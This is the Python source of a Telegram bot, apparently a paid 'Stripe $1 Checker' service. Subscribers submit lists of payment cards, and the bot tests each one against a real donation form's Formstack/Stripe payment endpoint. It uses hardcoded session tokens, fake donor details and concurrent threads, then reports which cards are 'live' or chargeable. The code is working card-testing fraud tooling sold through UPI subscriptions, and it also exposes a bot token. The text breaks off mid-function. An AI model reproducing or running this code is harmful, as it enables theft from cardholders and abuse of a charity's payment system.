import os
import json
import time
import requests
import logging
import threading
import random
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import telebot
from telebot import types
import user_agent

# ─────────────────────────────  CONFIG  ─────────────────────────────
BOT_TOKEN   = "9135601732:AAFPZcKE7EIIB9ySbiATAtMEl21klsuiETY"
OWNER_ID    = 7799774057
CHANNEL_ID  = "@TirexFre"
CHANNEL_URL = "https://t.me/TirexFre"
UPI_ID      = "kartikshu@fam"
DB_FILE     = "db.json"

CONCURRENCY = 10

PLANS = {
    "pro":   {"name": "PRO",   "limit": 1000,  "price": 149},
    "ultra": {"name": "ULTRA", "limit": 5000,  "price": 299},
    "max":   {"name": "MAX",   "limit": 15000, "price": 499}
}

# ─────────────────────────────  BOT  ────────────────────────────────
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

# ─────────────────────────────  STORAGE  ────────────────────────────
DEFAULT_DB = {
    "banned_users": [],
    "maintenance": False,
    "owner": OWNER_ID,
    "users": {},
    "pending_payments": {},
    "redeem_codes": {},
    "stats": {"checked": 0, "hits": 0, "started": str(datetime.utcnow())},
}

def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, "w") as f: json.dump(DEFAULT_DB, f, indent=2)
        return json.loads(json.dumps(DEFAULT_DB))
    with open(DB_FILE) as f: db = json.load(f)
    for k, v in DEFAULT_DB.items(): db.setdefault(k, v)
    return db

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)

db = load_db()

# ─────────────────────────────  STATE  ──────────────────────────────
user_state = {}
def set_state(uid, st): 
    if uid not in user_state: user_state[uid] = {}
    user_state[uid]["state"] = st
def get_state(uid):     
    return user_state.get(uid, {}).get("state", "menu")
def get_user_data(uid):
    return user_state.get(uid, {})

def get_user(uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {"sub": "none", "exp": 0, "used": 0, "history": 0, "username": "", "bonus_cards": 0}
    return db["users"][uid]

def check_sub_expiry(uid):
    u = get_user(uid)
    if u["sub"] != "none" and u["exp"] > 0 and time.time() > u["exp"]:
        u["sub"] = "none"
        u["exp"] = 0
        u["used"] = 0
        save_db(db)

def get_remaining(uid):
    if is_owner(uid): return 999999999  # Unlimited for owner
    u = get_user(uid)
    if u["sub"] == "none": return u.get("bonus_cards", 0)
    plan = PLANS.get(u["sub"])
    if not plan: return u.get("bonus_cards", 0)
    rem = (plan["limit"] - u["used"]) + u.get("bonus_cards", 0)
    return max(0, rem)

# ─────────────────────────────  HELPERS  ────────────────────────────
def is_owner(uid): return uid == db.get("owner", OWNER_ID)

def is_banned(uid):
    u = get_user(uid)
    uname = u.get("username", "").replace("@","").lower()
    return str(uid) in db["banned_users"] or (uname and uname in db["banned_users"])

def is_member(uid) -> bool:
    if is_owner(uid): return True # Owner bypass
    try:
        m = bot.get_chat_member(CHANNEL_ID, uid)
        return m.status in ("member", "administrator", "creator")
    except Exception as e:
        logging.warning(f"membership check failed: {e}")
        return False

# ─────────────────────────────  KEYBOARDS  ──────────────────────────
def kb_join():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL))
    kb.add(types.InlineKeyboardButton("✅ I Joined", callback_data="check_join"))
    return kb

def kb_menu(uid):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("💳 Check Cards", "📂 Upload File")
    kb.row("💎 Subscription Plans", "🔑 Redeem Code")
    kb.row("📊 My Stats")
    if is_owner(uid): kb.row("🛠 Admin Panel")
    return kb

def kb_cancel():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("❌ Cancel")
    return kb

def kb_admin():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🚫 Ban User",   callback_data="adm_ban"))
    kb.add(types.InlineKeyboardButton("🛑 Ban Subscription", callback_data="adm_ban_sub"))
    kb.add(types.InlineKeyboardButton("🎟 Generate Redeem", callback_data="adm_gen_redeem"))
    kb.add(types.InlineKeyboardButton(
        "🔧 Maintenance OFF" if db["maintenance"] else "🔧 Maintenance ON",
        callback_data="adm_maint"))
    kb.add(types.InlineKeyboardButton("📋 Banned List", callback_data="adm_list"))
    kb.add(types.InlineKeyboardButton("📈 Bot Stats",   callback_data="adm_stats"))
    return kb

def kb_maintenance():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="check_maint"))
    return kb

def kb_plans():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("PRO (1000 cards) - 149₹", callback_data="buy_pro"))
    kb.add(types.InlineKeyboardButton("ULTRA (5000 cards) - 299₹", callback_data="buy_ultra"))
    kb.add(types.InlineKeyboardButton("MAX (15000 cards) - 499₹", callback_data="buy_max"))
    return kb

# ─────────────────────────────  GATES  ──────────────────────────────
def gate(message) -> bool:
    uid = message.from_user.id
    if db["maintenance"] and not is_owner(uid):
        bot.reply_to(message, "🛠 <b>Bot is under maintenance.</b>\nPlease check back later.", reply_markup=kb_maintenance())
        return False
    if is_banned(uid):
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return False
    if not is_member(uid):
        bot.reply_to(message, "📢 <b>You must join our channel to use this bot.</b>", reply_markup=kb_join())
        return False
    return True

# ─────────────────────────────  CHECK LOGIC  ────────────────────────
def get_bin_info(binn):
    try:
        r = requests.get(f'https://binchk-api.vercel.app/bin={binn}', timeout=5).json()
        return r.get('brand', 'N/A'), r.get('type', 'N/A'), r.get('bank', 'N/A'), r.get('country', 'N/A'), r.get('flag', '🏳️')
    except Exception: return 'N/A', 'N/A', 'N/A', 'N/A', '🏳️'

def check_stripe(crd):
    crd = crd.strip()
    if not crd: return (crd, "error", "Empty")
    try: cn, mm, yy, cvv = crd.split('|')
    except ValueError: return (crd, "error", "Invalid Format")
    
    user = user_agent.generate_user_agent()
    headers = {'Accept': 'application/json', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV', 'Origin': 'https://formstack.io', 'Referer': 'https://formstack.io/', 'User-Agent': user}
    
    files = [
        ('inputdate', (None, '11/3/2024 4:21:19')), ('userTimeZone', (None, '300')), ('txtHtmlId', (None, '2hbx1Fv8p-niFCJlWMSc5A')), ('txtOrgId', (None, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')),
        ('txtRefreshToken', (None, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')), ('txtSessionID', (None, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')),
        ('submitMessage', (None, 'Thank you for your submission!')), ('paymentType', (None, 'Stripe')), ('formName', (None, 'Donation Management Form')), ('hfFileServiceApiKey', (None, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')),
        ('FSGFRadioButton356', (None, 'Company%20Donation')), ('Contact.FirstName', (None, 'williams')), ('Contact.LastName', (None, 'hiro')), ('Contact.Email', (None, 'aa0799414021%40gmail.com')), ('Contact.HomePhone', (None, '5124578451')),
        ('FSGFRadioButton346', (None, 'One-Time%20Donation')), ('FSGFDropdown701', (None, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')), ('Contact.Opportunity.A.Amount', (None, '1')),
        ('Contact.Opportunity.A.Funding_Program__c', (None, 'a0u8V00000AT2h7QAD')), ('Contact.Opportunity.A.CloseDate', (None, '11%2F03%2F2024')), ('Contact.Opportunity.A.Name', (None, 'New%20yorm%20External%20Donation%2011%2F03%2F2024')), ('Contact.Opportunity.A.RecordTypeId', (None, '0128V000001iNcAQAU')),
        ('Contact.Opportunity.A.CampaignId', (None, '7018V000000sLgrQAE')), ('Contact.Opportunity.A.Method_of_Payment__c', (None, 'Credit%20Card')), ('Contact.Opportunity.A.StageName', (None, 'Closed%20Won')), ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (None, 'Company%20Donation')),
        ('FFCreditCard14', (None, cn)), ('FFCVV14', (None, cvv)), ('FFExpiryMM14', (None, mm)), ('FFExpiryYYYY14', (None, yy)), ('Contact.AccountId.Name', (None, 'hiro%20Household')), ('Contact.AccountId.RecordTypeId', (None, '0128V000001iNc8QAE')), ('FSGFShortAnswer240', (None, '11%2F03%2F2024')),
        ('FSGFShortAnswer446', (None, 'williams_hiro_Monthly_Donation')), ('FSGFShortAnswer929', (None, 'williams_hiro_Annual_Donation')), ('ReturnUrl', (None, 'https://formstack.io/D5036')), ('submitted', (None, '1')),
    ]
    
    try:
        response = requests.post('https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment', headers=headers, files=files, timeout=20)
        txt = response.text
        binn = cn[:6]
        brand, ctype, bank, cnt, emj = get_bin_info(binn)
        
        if any(k in txt for k in ['declined', 'card number is incorrect', 'Sorry, we do not accept this', 'expiration']): status, msg = "declined", "Declined ❌"
        elif 'security code is incorrect' in txt: status, msg = "ccn", "CCN ✅"
        elif 'Your card could not be' in txt: status, msg = "live", "Live ✅"
        else: status, msg = "charge", "CHARGE $1 ✅"
        return (crd, status, msg, binn, brand, ctype, bank, cnt, emj)
    except Exception as e: return (crd, "error", f"Error: {str(e)[:20]}", "N/A", "N/A", "N/A", "N/A", "N/A", "🏳️")

def parse_creds(raw: str):
    out = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        if len(line.split('|')) == 4: out.append(line)
    return out

def run_check(message, creds):
    uid = message.from_user.id
    check_sub_expiry(uid)
    u = get_user(uid)
    
    is_own = is_owner(uid)
    remaining = get_remaining(uid)
    if remaining <= 0:
        set_state(uid, "menu")
        bot.reply_to(message, f"⚠️ <b>Limit Exhausted!</b>\nYou have 0 cards left.\n\nPlease upgrade your plan to continue checking.", reply_markup=kb_menu(uid))
        return

    total = len(creds)
    if not is_own and total > remaining:
        total = remaining
        creds = creds[:total]
        bot.send_message(message.chat.id, f"⚠️ Note: Checking only first <b>{total}</b> cards due to your remaining limit.")

    if total == 0: return

    status_msg = bot.reply_to(message, f"⏳ Starting check on <b>{total}</b> cards...\n0/{total} done")

    hits, declined, errors = [], 0, 0
    done = 0
    last_edit = 0
    lock = threading.Lock()

    def _edit_status():
        try: bot.edit_message_text(f"⏳ <b>Checking...</b>\nProgress: {done}/{total}\n✅ Hits: {len(hits)}\n❌ Declined: {declined}\n⚠️ Errors: {errors}", chat_id=status_msg.chat.id, message_id=status_msg.message_id)
        except Exception: pass

    def worker(card_line):
        nonlocal declined, errors, done, last_edit
        res = check_stripe(card_line)
        with lock:
            status = res[1]
            if status in ("ccn", "live", "charge"): hits.append(res)
            elif status == "declined": declined += 1
            else: errors += 1
            done += 1
            if time.time() - last_edit > 2.5 or done == total:
                last_edit = time.time()
                _edit_status()

    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        futures = [ex.submit(worker, c) for c in creds]
        for _ in as_completed(futures): pass

    if not is_own:
        if u["sub"] != "none":
            plan = PLANS.get(u["sub"], {"limit": 0})
            if u["used"] + total <= plan["limit"]:
                u["used"] += total
            else:
                used_from_plan = plan["limit"] - u["used"]
                u["used"] = plan["limit"]
                u["bonus_cards"] = max(0, u.get("bonus_cards", 0) - (total - used_from_plan))
        else:
            u["bonus_cards"] = max(0, u.get("bonus_cards", 0) - total)

    u["history"] = u.get("history", 0) + total
    db["stats"]["checked"] += total
    db["stats"]["hits"] += len(hits)
    save_db(db)

    lines = []
    if hits:
        lines.append("🎯 <b>HIT RESULTS</b>\n")
        for h in hits:
            crd, status, msg, binn, brand, ctype, bank, cnt, emj = h
            lines.append(f"💳 <code>{crd}</code>\n↯ <b>Response:</b> {msg}\n↯ <b>BIN:</b> {binn} - {brand} - {ctype}\n↯ <b>Bank:</b> {bank} | <b>Country:</b> {cnt} {emj}\n(Checked by TirexJod Bot)\n━━━━━━━━━━━━━━━━━━━━")
        lines.append("")
    
    rem_str = "Unlimited (Owner)" if is_own else str(get_remaining(uid))
    lines.append(f"📊 <b>SUMMARY</b>\n━━━━━━━━━━━━━━━━━━━━\n🔍 Total Checked: <code>{total}</code>\n❌ Declined: <code>{declined}</code>\n⚠️ Errors: <code>{errors}</code>\n✅ Successful: <code>{len(hits)}</code>\n\n🔋 <b>Remaining Limit:</b> <code>{rem_str}</code>")
    result_text = "\n".join(lines)
    if len(result_text) > 4000: result_text = result_text[:3900] + "\n\n… (truncated)"

    try: bot.edit_message_text(result_text, chat_id=status_msg.chat.id, message_id=status_msg.message_id)
    except Exception: bot.send_message(message.chat.id, result_text)

    if hits:
        fname = f"stripe_hits_{uid}_{int(time.time())}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            for h in hits: f.write(f"{h[0]} -> {h[2]}\n")
        with open(fname, "rb") as f: bot.send_document(message.chat.id, f, caption=f"✅ <b>{len(hits)}</b> hits found — archived.")
        try: os.remove(fname)
        except Exception: pass
    
    if not is_own and get_remaining(uid) <= 0:
        bot.send_message(message.chat.id, "❌ <b>Limit Finished!</b> Your plan limit is over. Please upgrade to check more cards.", reply_markup=kb_plans())

# ─────────────────────────────  MENU HANDLERS  ──────────────────────
@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid = message.from_user.id
    u = get_user(uid)
    u["username"] = message.from_user.username or ""
    save_db(db)
    
    if db["maintenance"] and not is_owner(uid): return bot.reply_to(message, "🛠 <b>Maintenance</b>", reply_markup=kb_maintenance())
    if is_banned(uid): return bot.reply_to(message, "🚫 Banned.")
    if not is_member(uid): return bot.reply_to(message, "📢 <b>Join channel to use bot.</b>", reply_markup=kb_join())
    
    set_state(uid, "menu")
    bot.reply_to(message, "✅ <b>Welcome to Stripe $1 Checker!</b>\nChoose an option below:", reply_markup=kb_menu(uid))

@bot.callback_query_handler(func=lambda c: c.data == "check_join")
def cb_check_join(cq):
    if is_member(cq.from_user.id):
        set_state(cq.from_user.id, "menu")
        try: bot.edit_message_text("✅ Verified.", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
        except Exception: pass
        bot.send_message(cq.from_user.id, "🏠 Menu:", reply_markup=kb_menu(cq.from_user.id))
    else: bot.answer_callback_query(cq.id, "❌ Join first.", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "check_maint")
def cb_check_maint(cq):
    if db["maintenance"] and not is_owner(cq.from_user.id):
        bot.answer_callback_query(cq.id, "Still in maintenance.", show_alert=True)
        return
    try: bot.edit_message_text("✅ Maintenance is over. /start to continue.", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
    except Exception: pass

@bot.message_handler(func=lambda m: m.text == "💳 Check Cards")
def menu_check(message):
    if not gate(message): return
    check_sub_expiry(message.from_user.id)
    if not is_owner(message.from_user.id) and get_remaining(message.from_user.id) <= 0:
        return bot.reply_to(message, "⚠️ <b>Limit Exhausted!</b> Upgrade to check cards.", reply_markup=kb_plans())
    set_state(message.from_user.id, "creds")
    bot.reply_to(message, "💳 <b>Send cards</b> in format:\n<code>CC|MM|YY|CVV</code>\n\nOne per line.", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: m.text == "📂 Upload File")
def menu_upload(message):
    if not gate(message): return
    check_sub_expiry(message.from_user.id)
    if not is_owner(message.from_user.id) and get_remaining(message.from_user.id) <= 0:
        return bot.reply_to(message, "⚠️ <b>Limit Exhausted!</b> Upgrade to check cards.", reply_markup=kb_plans())
    set_state(message.from_user.id, "file")
    bot.reply_to(message, "📂 <b>Upload .txt file</b>\nOne card per line:\n<code>CC|MM|YY|CVV</code>", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def menu_stats(message):
    if not gate(message): return
    uid = message.from_user.id
    check_sub_expiry(uid)
    u = get_user(uid)
    plan = PLANS.get(u["sub"], {"name": "None", "limit": 0})
    exp_str = datetime.fromtimestamp(u["exp"]).strftime('%d-%b-%Y %H:%M') if u["exp"] > 0 else "N/A"
    rem_str = "Unlimited (Owner)" if is_owner(uid) else str(get_remaining(uid))
    txt = f"📊 <b>Your Stats</b>\n━━━━━━━━━━━━━━━━━━━━\n💎 <b>Plan:</b> {plan['name']}\n📅 <b>Expires:</b> <code>{exp_str}</code>\n🔋 <b>Remaining:</b> <code>{rem_str}</code>\n📈 <b>Total Checked:</b> <code>{u.get('history', 0)}</code>"
    bot.reply_to(message, txt, reply_markup=kb_menu(uid))

@bot.message_handler(func=lambda m: m.text == "❌ Cancel")
def menu_cancel(message):
    set_state(message.from_user.id, "menu")
    bot.reply_to(message, "❌ Cancelled.", reply_markup=kb_menu(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == "🛠 Admin Panel")
def menu_admin(message):
    if not is_owner(message.from_user.id): return
    bot.reply_to(message, "🛠 <b>Admin Panel</b>", reply_markup=kb_admin())

# ─────────────────────────────  CRED INPUT  ─────────────────────────
@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "creds" and m.text and m.text != "❌ Cancel")
def on_creds(message):
    creds = parse_creds(message.text)
    set_state(message.from_user.id, "menu")
    threading.Thread(target=run_check, args=(message, creds), daemon=True).start()

@bot.message_handler(content_types=["document"], func=lambda m: get_state(m.from_user.id) == "file")
def on_file(message):
    if not message.document.file_name.endswith(".txt"): return bot.reply_to(message, "❌ Only <code>.txt</code> accepted.")
    try:
        file = bot.get_file(message.document.file_id)
        text = bot.download_file(file.file_path).decode("utf-8", errors="ignore")
    except Exception as e: return bot.reply_to(message, f"❌ Error: <code>{e}</code>")
    creds = parse_creds(text)
    set_state(message.from_user.id, "menu")
    threading.Thread(target=run_check, args=(message, creds), daemon=True).start()

# ─────────────────────────────  SUBSCRIPTION & UPI  ─────────────────
@bot.message_handler(func=lambda m: m.text == "💎 Subscription Plans")
def menu_plans(message):
    if not gate(message): return
    txt = "💎 <b>Subscription Plans (Valid 1 Week)</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for k, v in PLANS.items(): txt += f"🔹 <b>{v['name']}</b>: {v['limit']} Cards - <b>{v['price']}₹</b>\n"
    txt += f"\n💳 <b>Payment UPI:</b> <code>{UPI_ID}</code>\n\nSelect a plan to buy:"
    bot.reply_to(message, txt, reply_markup=kb_plans())

@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
def cb_buy_plan(cq):
    plan_key = cq.data.split("_")[1]
    plan = PLANS[plan_key]
    
    txt = f"🛒 <b>Plan: {plan['name']} ({plan['price']}₹)</b>\n\n1️⃣ Pay to UPI: <code>{UPI_ID}</code>\n2️⃣ Send me the <b>12-Digit UTR ID</b> below.\n3️⃣ Then send the <b>Payment Screenshot</b>."
    bot.send_message(cq.from_user.id, txt)
    set_state(cq.from_user.id, "wait_utr")
    user_state[cq.from_user.id]["plan"] = plan_key
    bot.send_message(cq.from_user.id, "Enter UTR:", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "wait_utr" and m.text)
def on_utr(message):
    if message.text == "❌ Cancel":
        set_state(message.from_user.id, "menu")
        return bot.reply_to(message, "Cancelled.", reply_markup=kb_menu(message.from_user.id))
    
    utr = message.text.strip()
    if not utr.isdigit() or len(utr) != 12:
        return bot.reply_to(message, "❌ Invalid UTR. Please send exactly 12 digits.")
    
    user_state[message.from_user.id]["utr"] = utr
    set_state(message.from_user.id, "wait_screenshot")
    bot.reply_to(message, "✅ UTR Saved. Now send the <b>Payment Screenshot</b>:", reply_markup=kb_cancel())

@bot.message_handler(content_types=["photo"], func=lambda m: get_state(m.from_user.id) == "wait_screenshot")
def on_screenshot(message):
    uid = message.from_user.id
    data = get_user_data(uid)
    plan = data.get("plan")
    utr = data.get("utr")
    
    if not plan or not utr: return bot.reply_to(message, "❌ Error. Start again.", reply_markup=kb_menu(uid))
    
    db["pending_payments"][str(uid)] = {"plan": plan, "utr": utr, "photo_id": message.photo[-1].file_id, "time": time.time()}
    save_db(db)
    
    bot.reply_to(message, "✅ <b>Payment submitted!</b> Wait for Owner approval.", reply_markup=kb_menu(uid))
    set_state(uid, "menu")
    
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"appr_{uid}"))
    kb.add(types.InlineKeyboardButton("❌ Reject", callback_data=f"rej_{uid}"))
    
    uname = message.from_user.username or f"ID:{uid}"
    owner_msg = f"💰 <b>New Payment!</b>\nUser: @{uname}\nPlan: {PLANS[plan]['name']}\nUTR: <code>{utr}</code>"
    bot.send_photo(OWNER_ID, message.photo[-1].file_id, caption=owner_msg, reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data.startswith("appr_") or c.data.startswith("rej_"))
def cb_approve_payment(cq):
    if not is_owner(cq.from_user.id): return
    action, uid_str = cq.data.split("_")
    if uid_str not in db["pending_payments"]: return bot.answer_callback_query(cq.id, "Already processed.")
    
    pd = db["pending_payments"].pop(uid_str)
    save_db(db)
    u = get_user(uid_str)
    
    if action == "appr":
        u["sub"] = pd["plan"]
        u["exp"] = time.time() + (7 * 24 * 60 * 60)
        u["used"] = 0
        save_db(db)
        try: bot.edit_message_caption("✅ Approved", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
        except: pass
        try: bot.send_message(uid_str, f"🎉 <b>Subscription Activated!</b>\nPlan: {PLANS[pd['plan']]['name']}\nValid for: 7 Days\nLimit: {PLANS[pd['plan']]['limit']} cards.", reply_markup=kb_menu(uid_str))
        except: pass
    else:
        try: bot.edit_message_caption("❌ Rejected", chat_id=cq.message.chat.id, message_id=cq.message.message_id)
        except: pass
        try: bot.send_message(uid_str, "❌ Your payment was rejected by Admin.")
        except: pass
    bot.answer_callback_query(cq.id, "Done.")

# ─────────────────────────────  REDEEM CODE  ────────────────────────
@bot.message_handler(func=lambda m: m.text == "🔑 Redeem Code")
def menu_redeem(message):
    if not gate(message): return
    set_state(message.from_user.id, "wait_redeem")
    bot.reply_to(message, "🔑 Enter your Redeem Code:", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "wait_redeem" and m.text)
def on_redeem(message):
    if message.text == "❌ Cancel":
        set_state(message.from_user.id, "menu")
        return bot.reply_to(message, "Cancelled.", reply_markup=kb_menu(message.from_user.id))
    
    code = message.text.strip().upper()
    uid = str(message.from_user.id)
    
    if code not in db["redeem_codes"]: return bot.reply_to(message, "❌ Invalid Code.")
    rc = db["redeem_codes"][code]
    
    if len(rc["used_by"]) >= rc["limit"]: return bot.reply_to(message, "❌ Code limit reached.")
    if uid in rc["used_by"]: return bot.reply_to(message, "❌ You already used this code.")
    
    u = get_user(uid)
    u["bonus_cards"] = u.get("bonus_cards", 0) + rc["cards"]
    
    rc["used_by"].append(uid)
    save_db(db)
    set_state(uid, "menu")
    bot.reply_to(message, f"✅ <b>Code Redeemed!</b>\n+{rc['cards']} Cards added to your limit.", reply_markup=kb_menu(uid))

# ─────────────────────────────  ADMIN PANEL  ────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "adm_ban")
def cb_ban(cq):
    if not is_owner(cq.from_user.id): return
    set_state(cq.from_user.id, "adm_ban_user")
    bot.send_message(cq.from_user.id, "🚫 Enter username to ban (e.g. @user):", reply_markup=kb_cancel())

@bot.message_handler(func=lambda m: get_state(m.from_user.id) == "adm_ban_user" and m.text and m.text != "❌ Cancel")
def on_adm_ban(message):
    uname = message.text.strip().lower().replace("@","")
    if uname not in db["banned_users"]:
        db["banned_users"].append(uname)
        save_db(db)
    set_state(message.from_user.id, "menu")
    bot.reply_to(message, f"🚫 @{uname} banned.", reply_markup=kb_menu(message.from_user.id))

@bot.callback_query_handler(func=lambda c: c.data == "adm_ban_sub")
def cb_ban_sub(cq):
    if not is_owner(cq.from_user.id): return
    subs = [u for u, d in db["users"].items() if d.get("sub") != "none"]
    if not subs: return bot.answer_callback_query(cq.id, "No active subs.")
    
    kb = types.InlineKeyboardMarkup()
    for uid in subs:
        u = db["users"][uid]
        name = u.get("username", uid)
        kb.add(types.InlineKeyboardButton(f"@{name} ({u['sub'].upper()})", callback_data=f"cansub_{uid}"))
    bot.send_message(cq.from_user.id, "🛑 Select subscription to cancel:", reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data.startswith("cansub_"))
def cb_cancel_sub(cq):
